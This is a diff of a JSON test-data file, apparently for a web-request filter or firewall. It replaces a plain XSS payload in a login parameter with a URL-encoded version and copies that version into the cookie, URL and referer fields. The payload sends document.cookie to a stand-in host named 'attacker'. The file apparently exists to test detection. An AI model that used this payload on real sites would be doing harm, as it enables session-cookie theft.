@@ -3,9 +3,12 @@
     {
       "Type": "ALL",
       "UA": "null",
-      "Body": "login=<a href='javascript:let test=document;location=`http://attacker?cookie=${test.cookie}`'>test</a>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
-      "ARGS": "login=<a href='javascript:let test=document;location=`http://attacker?cookie=${test.cookie}`'>test</a>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
-      "Headers": "CustomHeader: null"
+      "Body": "login%3D%3Ca%20href%3D%27javascript%3Alet%20test%3Ddocument%3Blocation%3D%60http%3A%2F%2Fattacker%3Fcookie%3D%24%7Btest.cookie%7D%60%27%3Etest%3C%2Fa%3E%26password1%3D1%26enter%3D%25D0%259E%25D1%2582%25D0%25BF%25D1%2580%25D0%25B0%25D0%25B2%25D0%25B8%25D1%2582%25D1%258C%2B%25D0%25B7%25D0%25B0%25D0%25BF%25D1%2580%25D0%25BE%25D1%2581",
+      "ARGS": "login%3D%3Ca%20href%3D%27javascript%3Alet%20test%3Ddocument%3Blocation%3D%60http%3A%2F%2Fattacker%3Fcookie%3D%24%7Btest.cookie%7D%60%27%3Etest%3C%2Fa%3E%26password1%3D1%26enter%3D%25D0%259E%25D1%2582%25D0%25BF%25D1%2580%25D0%25B0%25D0%25B2%25D0%25B8%25D1%2582%25D1%258C%2B%25D0%25B7%25D0%25B0%25D0%25BF%25D1%2580%25D0%25BE%25D1%2581",
+      "Cookie": "login%3D%3Ca%20href%3D%27javascript%3Alet%20test%3Ddocument%3Blocation%3D%60http%3A%2F%2Fattacker%3Fcookie%3D%24%7Btest.cookie%7D%60%27%3Etest%3C%2Fa%3E%26password1%3D1%26enter%3D%25D0%259E%25D1%2582%25D0%25BF%25D1%2580%25D0%25B0%25D0%25B2%25D0%25B8%25D1%2582%25D1%258C%2B%25D0%25B7%25D0%25B0%25D0%25BF%25D1%2580%25D0%25BE%25D1%2581",
+      "URL": "login%3D%3Ca%20href%3D%27javascript%3Alet%20test%3Ddocument%3Blocation%3D%60http%3A%2F%2Fattacker%3Fcookie%3D%24%7Btest.cookie%7D%60%27%3Etest%3C%2Fa%3E%26password1%3D1%26enter%3D%25D0%259E%25D1%2582%25D0%25BF%25D1%2580%25D0%25B0%25D0%25B2%25D0%25B8%25D1%2582%25D1%258C%2B%25D0%25B7%25D0%25B0%25D0%25BF%25D1%2580%25D0%25BE%25D1%2581",
+      "Referer": "login%3D%3Ca%20href%3D%27javascript%3Alet%20test%3Ddocument%3Blocation%3D%60http%3A%2F%2Fattacker%3Fcookie%3D%24%7Btest.cookie%7D%60%27%3Etest%3C%2Fa%3E%26password1%3D1%26enter%3D%25D0%259E%25D1%2582%25D0%25BF%25D1%2580%25D0%25B0%25D0%25B2%25D0%25B8%25D1%2582%25D1%258C%2B%25D0%25B7%25D0%25B0%25D0%25BF%25D1%2580%25D0%25BE%25D1%2581",
+      "Headers": "null"
     }
   ]
 }
